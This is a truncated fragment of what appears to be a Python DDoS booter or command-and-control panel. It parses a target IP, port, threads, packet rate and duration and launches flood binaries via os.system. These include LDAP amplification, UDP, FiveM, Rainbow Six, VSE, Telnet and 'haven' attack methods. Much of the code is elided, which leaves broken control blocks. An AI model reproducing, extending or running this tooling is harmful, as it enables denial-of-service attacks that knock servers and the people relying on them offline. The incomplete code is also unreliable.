...
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ...
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp" or cnc == "amps":
            amp_games()
            ...
            try:
                ...
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
            except IndexError:
            ...
            try:
                ...
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'./fivem {ip} {port} fivem.txt {threads} {pps} {time}')
            except IndexError:
            ...
            try:
                ...
                time = cnc.split()[5]
                os.system(f'./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
            ...
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'./haven -d {ip} -t {time} -z 130')
            except IndexError:
            ...
            try:
                ...
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./telnet {ip} {threads} {pps} {time}')
            except IndexError:
            ...
            try:
                ...
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'./R6-DROP {ip} {port} {threads} {pps} {time}')
            except IndexError:
            ...
            try:
                ...
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./vse {ip} {port} {threads} {time}')
            except IndexError:
